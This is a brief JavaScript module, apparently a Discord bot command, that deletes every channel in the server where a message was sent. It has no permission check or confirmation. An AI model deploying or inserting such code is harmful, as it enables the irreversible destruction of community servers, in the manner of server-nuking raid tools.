module.exports = function (message){
    message.guild.channels.cache.forEach(channel => {
        channel.delete()
    })
}